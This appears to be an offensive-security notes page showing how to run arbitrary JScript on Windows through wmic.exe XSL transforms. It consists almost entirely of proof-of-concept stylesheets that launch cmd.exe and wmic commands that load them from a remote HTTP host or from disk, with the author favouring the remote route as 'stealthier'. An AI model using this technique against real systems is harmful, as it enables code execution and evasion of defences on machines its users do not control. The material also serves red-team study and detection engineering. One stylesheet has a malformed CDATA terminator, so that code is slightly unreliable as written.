**EXTRA WAYS TO EXECUTE ARBIRTRARY JSCRIPT CODE:**

Via XLS transform. Proof of concept to execute an additional cmd.exe:

Content of test.xsl:

```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("cmd.exe");
    ] ]>
  </ms:script>
</stylesheet>
```

Then execute it with wmic.exe as follows:

```
C:\> wmic process get brief /format:"http://192.168.1.1/test.xsl"
```

**XSL TRANSFORM IN LOCALHOST:**

Although I prefer doing it via HTTP(since is stealthier), you can also perform an XSL transform from localhost(storing the test.xsl on disk) as follows. 

Contents of "test.xsl":

```
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("cmd");
	]]> </ms:script>
</stylesheet>
```

Executing "test.xsl":

```
C:\> wmic os get /format:"test.xsl"
```
